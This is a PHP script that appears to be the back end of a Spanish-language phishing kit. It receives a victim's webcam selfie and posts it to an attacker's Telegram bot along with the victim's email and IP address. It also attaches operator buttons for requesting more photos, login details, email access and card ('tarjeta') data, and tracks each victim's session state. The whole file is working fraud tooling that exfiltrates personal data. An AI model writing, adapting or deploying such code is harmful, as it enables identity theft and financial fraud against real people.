<?php
include 'data.php';
session_start();

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['photo'])) {
    $photoData = $_POST['photo'];
    
    // Remove the data URL prefix
    $photoData = str_replace('data:image/png;base64,', '', $photoData);
    $photoData = str_replace(' ', '+', $photoData);
    $photoBytes = base64_decode($photoData);
    
    // Save photo temporarily
    $tempFile = tempnam(sys_get_temp_dir(), 'selfie_') . '.png';
    file_put_contents($tempFile, $photoBytes);
    
    // Get IP
    $ip = $_SERVER['REMOTE_ADDR'];
    
    // Get user email from session
    $userEmail = isset($_SESSION['user_email']) ? $_SESSION['user_email'] : 'Desconocido';
    
    // Get session ID for button
    $sessionId = isset($_SESSION['user_session_id']) ? $_SESSION['user_session_id'] : md5($ip . time());
    
    // Inline keyboard with button
    $keyboard = [
        'inline_keyboard' => [
            [
                ['text' => '📸 Pedir Foto', 'callback_data' => 'photo_' . $sessionId],
                ['text' => '🔁 Login', 'callback_data' => 'login_' . $sessionId]
            ],
            [
                ['text' => '📩 Mail', 'callback_data' => 'mail_' . $sessionId],
                ['text' => '💳 Tarjeta', 'callback_data' => 'tarjeta_' . $sessionId]
            ],
            [
                ['text' => '✅ Listo', 'callback_data' => 'listo_' . $sessionId]
            ]
        ]
    ];
    
    // Send photo to Telegram
    $url = "https://api.telegram.org/bot$botToken/sendPhoto";
    
    $postFields = [
        'chat_id' => $chatID,
        'photo' => new CURLFile($tempFile, 'image/png', 'selfie.png'),
        'caption' => "📸 Selfie recibida\n👤 Usuario: $userEmail\n🌐 IP: $ip",
        'reply_markup' => json_encode($keyboard)
    ];
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_exec($ch);
    curl_close($ch);
    
    // Delete temp file
    unlink($tempFile);
    
    // Reset session to waiting
    $sessionId = isset($_SESSION['user_session_id']) ? $_SESSION['user_session_id'] : '';
    if (!empty($sessionId)) {
        $sessionFile = __DIR__ . '/sessions/' . $sessionId . '.txt';
        file_put_contents($sessionFile, 'waiting');
    }
    
    echo json_encode(['success' => true]);
} else {
    echo json_encode(['success' => false]);
}
?>
